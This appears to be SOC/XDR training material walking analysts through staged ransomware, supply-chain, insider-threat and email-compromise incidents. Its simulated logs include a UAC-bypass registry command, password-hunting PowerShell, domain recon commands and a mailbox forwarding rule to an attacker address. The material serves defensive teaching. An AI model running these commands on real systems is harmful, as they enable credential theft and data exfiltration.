## Scenario 1: Ransomware Attack

*(Original scenario — see teaching notes at end for full detail)*

### Stage 1: Initial Compromise
**Context**: Monday 09:15, SOC analyst on duty.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 09:12 | Endpoint | Suspicious Office Macro Execution | High | DESKTOP-SALES-03 |
| 09:13 | Network | Connection to Known Malicious IP | Critical | DESKTOP-SALES-03 |

**Raw Log Sample**:
```
ProcessName: WINWORD.EXE
CommandLine: "C:\Program Files\Microsoft Office\WINWORD.EXE" /automation -Embedding
ChildProcess: powershell.exe -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0A...
User: jsmith@company.com
ParentPID: 4892 | ChildPID: 5124
```

**MITRE ATT&CK**: T1566.001 (Spearphishing Attachment), T1059.001 (PowerShell)

**Questions**: What attack vector is this? What's the attacker's next goal?

---

### Stage 2: Credential Access & Privilege Escalation
**Context**: 15 minutes later.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 09:28 | Endpoint | LSASS Memory Access | Critical | DESKTOP-SALES-03 |
| 09:31 | Endpoint | UAC Bypass Attempt | High | DESKTOP-SALES-03 |

**Raw Log**:
```
TargetProcess: lsass.exe (PID: 668)
SourceProcess: rundll32.exe (PID: 5892)
AccessType: PROCESS_VM_READ

RegistryKey: HKCU\Software\Classes\ms-settings\Shell\Open\command
RegistryValue: cmd.exe /c powershell.exe -ep bypass -file C:\Users\jsmith\AppData\Local\Temp\priv.ps1
```

**MITRE ATT&CK**: T1003.001 (LSASS Dump), T1548.002 (UAC Bypass)

---

### Stage 3: Lateral Movement
**Context**: 30 minutes later, multiple hosts.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 10:02 | Network | Unusual SMB Traffic | High | DESKTOP-SALES-03 → FILE-SRV-01 |
| 10:04 | Endpoint | Remote Service Creation | Critical | FILE-SRV-01 |
| 10:05 | Endpoint | PsExec Execution | Critical | FILE-SRV-01 |

**MITRE ATT&CK**: T1021.002 (SMB/Windows Admin Shares), T1569.002 (Service Execution)

---

### Stage 4: Ransomware Execution
**Context**: 20 minutes later. Critical alerts flood in.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 10:28 | Endpoint | Mass File Modification | Critical | FILE-SRV-01 |
| 10:28 | Endpoint | Unknown Binary Encryption | Critical | FILE-SRV-01 |
| 10:29 | Cloud | Rapid Backup Deletion | Critical | Azure Backup Vault |
| 10:30 | Endpoint | Ransom Note Creation | Critical | Multiple Hosts |

**Raw Log**:
```
Files Modified: 8,472 files in 2 minutes
Pattern: .docx → .docx.locked
Entropy: 4.2 → 7.9 (encryption indicator)

Cloud Action: Delete-AzRecoveryServicesBackupProtectionPolicy
Principal: admin_svc@company.onmicrosoft.com
```

**MITRE ATT&CK**: T1486 (Data Encrypted for Impact), T1490 (Inhibit System Recovery)

---

## Scenario 2: Supply Chain Compromise

### Background
A trusted software vendor was compromised. Attackers injected malicious code into a legitimate update package. Users are unaware—they intentionally installed what looks like a routine patch.

### Stage 1: Trojanized Update Deployed

**Context**: Tuesday 14:30. Automated patching deployed an update to 150 endpoints last night.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 14:27 | Endpoint | Unusual Network Beacon from Trusted App | Medium | Multiple (23 hosts) |
| 14:28 | Network | Periodic Outbound HTTPS to Uncommon CDN | Low | Multiple Hosts |

**Raw Log Sample**:
```
ProcessName: InventoryAgent.exe (Version 4.1.2 — legitimately signed)
Publisher: AcmeCorp Software (Valid Certificate — SHA256: 3A4F...)
Signature: VALID
ParentProcess: services.exe
NetworkConnection:
  Destination: cdn-update-check[.]akmcdn[.]com (95.143.172.44)
  Port: 443 | Protocol: HTTPS
  Frequency: Every 4 minutes (± 30s jitter)
  DataSent: ~1.2 KB per beacon
```

**MITRE ATT&CK**: T1195.002 (Supply Chain: Software), T1071.001 (Application Layer Protocol: HTTPS), T1568.002 (Dynamic Resolution)

**Interactive Questions**:
1. The binary is legitimately signed. Why might XDR still flag it?
2. What makes the beacon pattern suspicious even though it's encrypted?

**Hint option**: "The certificate validates the publisher identity — but not what the code does after installation."

**Detailed Analysis** (on request):
XDR flagged this because the **behavior** changed even though the binary is trusted. The prior version of InventoryAgent.exe never made outbound connections to CDN endpoints. XDR's behavioral baseline shows a sudden new network pattern post-update. The jitter in beacon frequency is a common C2 anti-detection technique. The destination domain uses typosquatting (`akmcdn` vs `akamaiedge`) — caught by threat intelligence integration.

**Key XDR Correlation**: Application behavioral baseline + Threat intelligence feed + Domain reputation analysis

---

### Stage 2: Hands-on Keyboard Activity

**Context**: 6 hours later. Activity spikes on 3 hosts.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 20:14 | Endpoint | Living-off-the-Land Tool Execution | High | DEV-WS-12 |
| 20:17 | Endpoint | Suspicious WMI Query | High | DEV-WS-12 |
| 20:21 | Endpoint | Staged Data in Temp Directory | Medium | DEV-WS-12 |

**Raw Log**:
```
ProcessTree:
  InventoryAgent.exe (PID: 2244)
  └─ cmd.exe /c "nltest /domain_trusts" 
  └─ cmd.exe /c "net group \"Domain Admins\" /domain"
  └─ wmic.exe process where "name like '%sql%'" get processid,name,executablepath
  └─ powershell.exe -c "Get-ChildItem C:\inetpub -Recurse -Include *.config | Select-String 'password'"

File Activity:
  C:\Windows\Temp\~collect.tmp  [Created, 4.7 MB]
  Contents: Aggregated config files, connection strings
```

**MITRE ATT&CK**: T1057 (Process Discovery), T1069.002 (Domain Groups), T1552.001 (Credentials in Files), T1074 (Data Staged)

**Interactive Questions**:
1. Why is using built-in Windows tools (`wmic`, `nltest`, `net`) an evasion technique?
2. What is the attacker likely preparing for with the staged data?

---

### Stage 3: Exfiltration via Legitimate Channel

**Context**: 30 minutes later.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 20:52 | Network | Large Outbound Upload via HTTPS | High | DEV-WS-12 |
| 20:53 | Cloud | Abnormal API Access Pattern (GitHub) | Medium | DEV-WS-12 |

**Raw Log**:
```
Network Flow:
  Process: InventoryAgent.exe
  Destination: api.github[.]com (140.82.114.6)
  Transfer: 4.9 MB uploaded
  Method: POST /repos/[redacted]/[redacted]/contents/

DNS Sequence (preceding the upload):
  cdn-update-check.akmcdn.com → CNAME → api.github.com
  [C2 redirected to legitimate service for exfiltration]
```

**MITRE ATT&CK**: T1048.002 (Exfiltration over HTTPS), T1567.001 (Exfiltration to Code Repository)

**Interactive Questions**:
1. Why is exfiltrating to GitHub difficult to block with traditional firewalls?
2. How did XDR connect this upload back to the original supply chain compromise?

**Detailed Analysis** (on request):
Attackers used GitHub's legitimate API as an exfiltration channel because most organizations whitelist `api.github.com`. Traditional perimeter firewalls can't distinguish malicious from legitimate GitHub API usage. XDR correlated the upload by tracing the **process ancestry** — the upload originated from `InventoryAgent.exe`, the same process flagged 6 hours earlier for C2 beaconing. Without cross-session process correlation, this upload would look completely benign.

**Key XDR Correlation**: Cross-session process ancestry tracking + DNS resolution chain analysis + Data transfer volume anomaly

---

### Final Summary: Supply Chain Attack Chain

```
Attack Timeline & XDR Correlation
═══════════════════════════════════════════════════════════════════

D-30 days ─┬─ Vendor Build Server Compromised (off-network)
            │   └─ Malicious code injected into InventoryAgent 4.1.2
            │       [Supply Chain Compromise - T1195.002]
            │
14:27 ──────┼─ Trojanized Update Installed (150 endpoints)
            │   └─ Network: C2 beacon to spoofed CDN domain
            │       [Initial Access via Supply Chain]
            │
20:14 ──────┼─ Hands-on Keyboard: Reconnaissance
            │   └─ Endpoint: LotL tools, WMI queries
            │   └─ Endpoint: Credential file harvesting
            │       [Discovery + Credential Access]
            │
20:52 ──────┴─ Exfiltration via GitHub API
                └─ Network: 4.9 MB to attacker's repo
                    [Exfiltration - T1048.002, T1567.001]
```

**Key Lesson**: The binary was signed and trusted. XDR detected the threat purely through **behavioral change** — comparing post-update behavior against the established baseline of the prior version.

---

## Scenario 3: Insider Threat & Data Exfiltration

### Background
A senior engineer with broad data access is leaving the company in two weeks. HR flagged an unusual resignation. Security is asked to monitor quietly.

### Stage 1: Unusual Access Pattern

**Context**: Wednesday 22:40. After-hours activity detected.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 22:38 | Endpoint | After-Hours Login to Sensitive System | Medium | CORP-WS-07 |
| 22:41 | Endpoint | Mass File Access — R&D Share | High | CORP-WS-07 |
| 22:43 | Cloud | Bulk Download from SharePoint | Medium | User: mchen |

**Raw Log**:
```
User: mchen@company.com
AuthMethod: Password + MFA (approved)
LoginTime: 22:38 (99th percentile for this user — typical hours: 08:00–18:30)
AccessedShare: \\FILE-SRV-02\RnD-Confidential\
FilesAccessed: 2,341 files in 4 minutes
FileTypes: .dwg, .pdf, .xlsx (CAD designs, financial models)

SharePoint Activity:
  Action: BulkDownload
  Files: 847 items
  TotalSize: 3.2 GB
  ClientIP: 10.20.5.12 (Corp VPN)
```

**MITRE ATT&CK**: T1078 (Valid Accounts), T1083 (File and Directory Discovery), T1530 (Data from Cloud Storage)

**Interactive Questions**:
1. The login used valid credentials AND MFA. Why is this still suspicious?
2. What data signals tell you this is abnormal even without knowing the employee is leaving?

**Hint option**: "Think about the combination of time, volume, and file types — each alone might be OK, but together they paint a picture."

**Detailed Analysis** (on request):
XDR's UEBA (User and Entity Behavior Analytics) built a baseline for mchen: typical working hours, typical data access volumes, typical accessed directories. The combination of **after-hours login + 3.2 GB bulk download of sensitive R&D files** is a multi-sigma deviation from the baseline. Valid credentials and MFA prove identity — they don't validate intent. XDR scored this as high-risk by combining time anomaly, volume anomaly, and data sensitivity classification.

**Key XDR Correlation**: UEBA behavioral baseline + Data classification tagging + Time-of-day risk scoring

---

### Stage 2: Staging and Obfuscation

**Context**: 20 minutes later.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 23:02 | Endpoint | Zip Compression of Large Data Volume | Medium | CORP-WS-07 |
| 23:05 | Endpoint | Rename to Benign Filename | Low | CORP-WS-07 |
| 23:07 | Endpoint | Personal Cloud Storage App Launched | High | CORP-WS-07 |

**Raw Log**:
```
Process: 7z.exe
CommandLine: 7z.exe a -p"[redacted]" C:\Users\mchen\Desktop\vacation_photos.zip C:\Users\mchen\Downloads\RnD-Confidential\*
ArchiveSize: 2.9 GB
PasswordProtected: YES

File renamed:
  Before: vacation_photos.zip
  After: vacation_photos_2024_July.zip  [no change in content]

Process: Dropbox.exe (personal account — not corporate)
  Action: Upload initiated
  Files: vacation_photos_2024_July.zip
```

**MITRE ATT&CK**: T1074.001 (Local Data Staging), T1036 (Masquerading), T1048 (Exfiltration over Alternative Protocol)

**Interactive Questions**:
1. Why does the filename rename not fool XDR?
2. Why is password-protecting the archive an additional concern in an insider threat investigation?

---

### Stage 3: Exfiltration Attempt

**Context**: 10 minutes later.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 23:18 | Network | Large Upload to Personal Cloud Storage | Critical | CORP-WS-07 |
| 23:19 | DLP | Policy Violation: Sensitive File Upload Blocked | High | CORP-WS-07 |

**Raw Log**:
```
Network Flow:
  Process: Dropbox.exe
  Destination: api.dropboxapi[.]com (162.125.4.6)
  Protocol: HTTPS
  Upload Attempted: 2.9 GB
  Status: BLOCKED by DLP policy

DLP Event:
  PolicyTriggered: "Bulk Upload > 500MB to Personal Storage"
  Action: Block + Alert + Screenshot captured
  UserNotified: No (silent policy)
```

**Interactive Questions**:
1. XDR blocked the upload — is the incident over? What should happen next?
2. What forensic evidence would you preserve from this incident?

**Detailed Analysis** (on request):
The exfiltration was blocked, but the incident is **not over**. The data was already staged locally in an encrypted zip. The user could attempt exfiltration via:
- Personal phone (USB transfer)
- Email to personal account
- Printing physical documents
- A different network (phone hotspot)

Immediate response: **HR + Legal notification**, silent monitoring continuation, endpoint isolation **only if** legal authorizes it (premature isolation could tip off the user and destroy evidence). Preserve: file access logs, process logs, screenshot captured by DLP, network flows.

**Key XDR Correlation**: UEBA risk scoring + DLP policy enforcement + Process behavior + Network monitoring

---

## Scenario 4: Business Email Compromise (BEC)

### Background
Attackers have been monitoring the company's email for 3 weeks. They're about to execute a fraudulent wire transfer by impersonating the CEO.

### Stage 1: Credential Phishing

**Context**: Thursday 10:05. A targeted phishing email hits the CFO's inbox.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 10:03 | Email | Lookalike Domain Email Received | High | CFO-LAPTOP-01 |
| 10:06 | Network | Click-through to Phishing Page | Critical | CFO-LAPTOP-01 |
| 10:08 | Cloud | New MFA Device Registered | Critical | Azure AD (user: lchan) |

**Raw Log**:
```
Email Header:
  From: "James Morrison CEO" <jmorrison@company-corp[.]com>
  (Legitimate: jmorrison@company.com)
  Subject: Urgent: Wire Transfer Needed Today
  X-Originating-IP: 185.220.101.x (Tor exit node)

Browser Activity:
  URL: hxxps://login-company[.]microsoftonline-secure[.]com/...
  Certificate: Valid (Let's Encrypt — issued 2 days ago)
  
Azure AD Event:
  Action: Register-MFADevice
  User: lchan@company.com
  DeviceType: Authenticator App
  IPAddress: 192.168.1.x (unfamiliar location: Romania)
```

**MITRE ATT&CK**: T1566.002 (Phishing: Spearphishing Link), T1078.004 (Cloud Accounts), T1098.005 (Additional MFA Methods)

**Interactive Questions**:
1. The phishing site had a valid HTTPS certificate. Why doesn't that mean it's safe?
2. What does registering a new MFA device immediately after a suspicious login tell you?

**Hint option**: "HTTPS means encrypted, not safe. Anyone can get a free Let's Encrypt certificate for any domain they register."

---

### Stage 2: Mailbox Reconnaissance

**Context**: 3 hours after credential theft.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 13:11 | Cloud | Bulk Email Rule Created | High | M365 (user: lchan) |
| 13:15 | Cloud | Mass Email Read Access | Medium | M365 (user: lchan) |
| 13:22 | Cloud | Email Forwarding Rule — External | Critical | M365 (user: lchan) |

**Raw Log**:
```
M365 Audit:
  Action: New-InboxRule
  RuleName: ""  [blank — intentionally hidden]
  Conditions: Subject contains ["wire", "transfer", "invoice", "bank", "payment"]
  Action: MarkAsRead + MoveToFolder("RSS Subscriptions")  [obscured]

  Action: Set-Mailbox -ForwardingSmtpAddress attacker@protonmail[.]com
  IPAddress: 185.220.101.x (same Tor exit node as Stage 1)
```

**MITRE ATT&CK**: T1114.002 (Email Forwarding Rule), T1564.008 (Email Hiding Rules)

**Interactive Questions**:
1. Why did the attacker name the rule blank and move emails to "RSS Subscriptions"?
2. What business impact could email forwarding to an external address have?

---

### Stage 3: Fraudulent Wire Transfer

**Context**: Next day, 09:30.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 09:28 | Email | Impersonation of Finance Email Chain | Critical | Finance-PC-03 |
| 09:35 | Cloud | Approval Email Sent — Unusual Recipient | High | M365 |

**Raw Log**:
```
Email intercepted by attacker (via forward rule):
  From: vendor@legitimate-supplier[.]com
  To: lchan@company.com
  Subject: Invoice #8821 — Payment Due

Attacker reply (sent from stolen account):
  From: lchan@company.com  [LEGITIMATE account]
  To: accountspayable@company.com
  Body: "Please process payment for Invoice #8821.
         Updated banking details attached.
         Wire to: [Attacker's mule account]"
  Attachment: Invoice_8821_UPDATED.pdf
              [PDF is real invoice with bank details replaced]
```

**Interactive Questions**:
1. The email came from a legitimate internal account. How can XDR detect this as fraudulent?
2. What procedural control could have stopped this even if XDR missed it?

**Detailed Analysis** (on request):
XDR correlates the email send event with the prior alerts: the lchan account was flagged 23 hours ago for MFA device registration from an unusual location. The email was sent from an IP address associated with the Tor exit node used in Stage 1. XDR created a **unified incident timeline** linking the phishing, credential theft, inbox rules, and fraudulent email as a single BEC campaign.

The procedural control: **out-of-band verbal confirmation** for any wire transfer or change of bank details (call the requestor on their known phone number, never reply to email).

**Key XDR Correlation**: Cloud audit log correlation + IP reputation chaining across sessions + Identity risk score elevation

---

